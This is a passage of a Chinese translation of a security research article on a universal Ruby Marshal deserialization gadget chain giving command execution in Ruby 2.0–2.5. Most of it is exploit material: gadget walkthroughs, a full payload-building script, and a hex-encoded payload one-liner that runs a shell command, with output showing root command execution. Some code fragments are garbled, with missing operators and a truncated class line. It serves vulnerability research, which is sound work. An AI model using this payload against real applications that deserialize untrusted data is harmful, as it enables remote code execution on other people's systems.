    ...
      def cache # :nodoc:
    ...
          system @git, 'clone', '--quiet', '--bare', '--no-hardlinks',
                 @repository, repo_cache_dir
    ...
      end
    ...
图13:这个gadget可以用来让to_s返回除预期的字符串对象之外的内容(lib/rubygems/security/policy.rb)
    class Gem::Security::Policy
    ...
      attr_reader :name
    ...
      alias to_s name # :nodoc:
    end
图14:这个gadget可以用来让to_i返回期望的整数对象以外的内容(lib/ipaddr.rb)
    class IPAddr
    ...
      def to_i
        return @addr
      end
    ...
图15:这段代码生成一个gadget链，当反序列化进入一个无限循环
    module Gem
      class List
        attr_accessor :value, :tail
      end
    end
    $x = Gem::List.new
    $x.value = :@elttam
    $x.tail = $x
    class SimpleDelegator
      def marshal_dump
        [
          :__v2__,
          $x,
          [],
          nil
        ]
      end
    end
    ace = SimpleDelegator.new(nil)
    puts Marshal.dump(ace).inspect
# 打造gadget chain
创建gadget
chain的第一步是构建一个初始gadget池候选marshal_load，并确保它们对我们提供的对象调用方法。这很可能包含每个初始的gadget，因为Ruby中的"一切都是对象"。我们可以通过检查并实现在我们控制的对象上保留任何调用公共方法名的方法来减少这个gadget池。理想情况下，公共方法名应该有许多不同的实现可供选择。
对于我的gadget chain，我选择了Gem:: requirements类，它的实现如下所示，并授予对任意对象调用each方法的能力。
图16:Gem::Requirement部分源代码(lib/rubygems/requirement.rb)参考注释：
    class Gem::Requirement
      # 1) we have complete control over array
      def marshal_load(array)
        # 2) so we can set @requirements to an object of our choosing
        @requirements = array[0]
        fix_syck_default_key_in_requirements
      end
      # 3) this method is invoked by marshal_load
      def fix_syck_default_key_in_requirements
        Gem.load_yaml
        # 4) we can call .each on any object
        @requirements.each do |r|
          if r[0].kind_of? Gem::SyckDefaultKey
            r[0] = "="
          end
        end
      end
    end
现在，我们可以调用each方法了，我们需要each方法的一个有用实现，以使我们更接近于任意命令的执行。在查看Gem::DependencyList(以及mixin
Tsort)的源代码后，发现对它的each实例方法的调用都会导致对它的@specs实例变量调用sort方法。这里不包括访问sort方法调用所采取的确切路径，但是可以通过以下命令验证该行为，该命令使用Ruby的stdlib
[Tracer](https://ruby-doc.org/stdlib-2.5.0/libdoc/tracer/rdoc/Tracer.html)类输出源级执行跟踪:
图17：验证Gem::DependencyList#每个在@specs.sort中的结果
    $ ruby -rtracer -e 'dl=Gem::DependencyList.new; dl.instance_variable_set(:@specs,[nil,nil]); dl.each{}' |& fgrep '@specs.sort'
    #0:/usr/share/rubygems/rubygems/dependency_list.rb:218:Gem::DependencyList:-:     specs = @specs.sort.reverse
有了这种对任意对象数组调用sort方法的新功能，我们可以利用它对任意对象调用方法([spaceship
operator](https://en.wikipedia.org/wiki/Three-way_comparison))。这很有用，因为Gem::Source::SpecificFile有一个方法的实现，当调用这个方法时，它可以在它的@spec实例变量上调用name方法，如下所示：
图18：Gem::Source::SpecificFile部分源码(lib/rubygems/source/specific_file.rb)
    class Gem::Source::SpecificFile  other
        case other
        when Gem::Source::SpecificFile then
          return nil if @spec.name != other.spec.name # [1]
          @spec.version  other.spec.version
        else
          super
        end
      end
    end
能在任意对象上调用name方法是所有过程的最后一步，因为Gem::StubSpecification有一个name方法，它调用它的data方法。然后data方法调用open方法，这实际上是Kernel.open，它的实例变量@loaded_from作为第一个参数，如下所示:
图19：Gem::BasicSpecification部分源码  
(lib/rubygems/basic_specification.rb)和
Gem::StubSpecification(lib/rubygems/stub_specification.rb):
    class Gem::BasicSpecification
      attr_writer :base_dir # :nodoc:
      attr_writer :extension_dir # :nodoc:
      attr_writer :ignored # :nodoc:
      attr_accessor :loaded_from
      attr_writer :full_gem_path # :nodoc:
    ...
    end
    class Gem::StubSpecification &2")
    puts "STEP n"
    stub_specification.name rescue nil
    puts
    class Gem::Source::SpecificFile
      def initialize; end
    end
    specific_file = Gem::Source::SpecificFile.new
    specific_file.instance_variable_set(:@spec, stub_specification)
    other_specific_file = Gem::Source::SpecificFile.new
    puts "STEP n-1"
    specific_file  other_specific_file rescue nil
    puts
    $dependency_list= Gem::DependencyList.new
    $dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])
    puts "STEP n-2"
    $dependency_list.each{} rescue nil
    puts
    class Gem::Requirement
      def marshal_dump
        [$dependency_list]
      end
    end
    payload = Marshal.dump(Gem::Requirement.new)
    puts "STEP n-3"
    Marshal.load(payload) rescue nil
    puts
    puts "VALIDATION (in fresh ruby process):"
    IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
      pipe.print payload
      pipe.close_write
      puts pipe.gets
      puts
    end
    puts "Payload (hex):"
    puts payload.unpack('H*')[0]
    puts
    require "base64"
    puts "Payload (Base64 encoded):"
    puts Base64.encode64(payload)
下面在一个空的Ruby进程上使用Bash命行验证并成功执行payload，据测试，版本2.0到2.5受到影响:
    $ for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
    uid=0(root) gid=0(root) groups=0(root)
    uid=0(root) gid=0(root) groups=0(root)
    uid=0(root) gid=0(root) groups=0(root)
    uid=0(root) gid=0(root) groups=0(root)
    uid=0(root) gid=0(root) groups=0(root)
    uid=0(root) gid=0(root) groups=0(root)
# 结论
本文探索并发布了一个通用gadget chain，它可以在Ruby 2.0到2.5版本中实现命令执行。
正如本文所阐述的，Ruby标准库的复杂知识在构建反序列化gadget chain方面非常有用。在将来的工作有很多机会，包括使该技术涵盖Ruby
1.8和1.9版本，以及使用命令行参数--disable-all调用Ruby进程的实例。还可以研究其他Ruby的实现，如JRuby和Rubinius。
有一些关于 [Fuzzing Ruby C
extensions](https://schd.ws/hosted_files/bsidessf2018/de/Fuzzing_Ruby_C_Extensions.pdf)和[Breaking
Ruby’s Unmarshal with AFL-Fuzz](https://medium.com/fuzzstation/breaking-rubys-unmarshal-with-afl-fuzz-6b5f72b581d5)，，包括代码审计的研究。在完成这项研究之后，似乎有足够的机会进一步研究marshal_load方法的代码实现。
在C语言中实现的marshal_load实例:
    complex.c:    rb_define_private_method(compat, "marshal_load", nucomp_marshal_load, 1);
    iseq.c:    rb_define_private_method(rb_cISeq, "marshal_load", iseqw_marshal_load, 1);
    random.c:    rb_define_private_method(rb_cRandom, "marshal_load", random_load, 1);
    rational.c:    rb_define_private_method(compat, "marshal_load", nurat_marshal_load, 1);
    time.c:    rb_define_private_method(rb_cTime, "marshal_load", time_mload, 1);
    ext/date/date_core.c:    rb_define_method(cDate, "marshal_load", d_lite_marshal_load, 1);
    ext/socket/raddrinfo.c:    rb_define_method(rb_cAddrinfo, "marshal_load", addrinfo_mload, 1);
谢谢阅读!